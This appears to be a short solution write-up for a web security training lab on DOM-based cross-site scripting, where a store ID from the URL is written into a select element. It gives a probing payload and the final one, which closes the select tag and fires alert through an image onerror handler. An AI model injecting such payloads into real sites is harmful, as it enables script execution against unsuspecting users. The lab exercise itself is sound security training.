# Lab: DOM XSS in document.write sink using source location.search inside a select element

**End Goal:** Perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.

**Analysis**

*Open a product page and add a random store ID in the URL to check*

[&storeId=test123](https://0ad3002b0447ea588006214000a000d6.web-security-academy.net/product?productId=1&storeId=test123)

*test123 appears in the dropdown menu. So now we can replace it with a real payload.*

<img src=1 onerror=alert(1)>

*Nothing fires. The browser won't run elements while they're inside a <select>, so I need to close the select first.*

**Answer:** 

</select><img src=1 onerror=alert(1)>





